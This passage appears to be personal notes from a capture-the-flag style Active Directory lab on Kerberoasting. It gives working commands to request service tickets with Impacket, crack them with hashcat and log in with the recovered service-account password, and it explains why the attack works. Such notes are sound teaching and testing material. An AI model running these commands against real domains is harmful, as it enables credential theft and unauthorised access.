
Targets **service accounts with registered SPNs**.

An authenticated user can request service tickets and attempt to crack them offline.

### Enumerate & Request Tickets

Let's use Claire's account with Impacket's `GetUserSPNs.py` to enumerate these accounts:
```bash
GetUserSPNs.py thm.loc/claire:'Password123!' \
-dc-ip 192.168.11.100 -request
```
- the tool path --> /home/eyad/.local/share/pipx/venvs/impacket/bin
- `GetUserSPNs.py` → Finds accounts with SPNs.
- `-dc-ip` → Specifies the Domain Controller.
- `-request` → Requests the service tickets.

The output contains a `$krb5tgs$23$...` hash.

### Crack the TGS

```bash
hashcat -m 13100 service_ticket.txt rockyou.txt
```
- `-m 13100` → Kerberos TGS-REP hash mode.
- `service_ticket.txt` → Extracted ticket hash.
The hash will be in Hashcat format and will begin with `$krb5tgs$23$`

Then use the recovered service-account password:
```bash
smbclient.py 'thm.loc/svc_printer:<PASSWORD>'@192.168.11.51
```

**Concept:**
```text
Authenticated User
       ↓
Find SPNs
       ↓
Request TGS
       ↓
Extract TGS Hash
       ↓
Offline Crack
       ↓
Service Account Password
```

**Why This Works:** Service tickets are encrypted using the service account's password hash and can be requested by any authenticated user. Since the encryption is performed with RC4 or AES, the tickets can be subject to offline password cracking. Service accounts often have weak or unchanged passwords because they are not rotated regularly like user passwords.
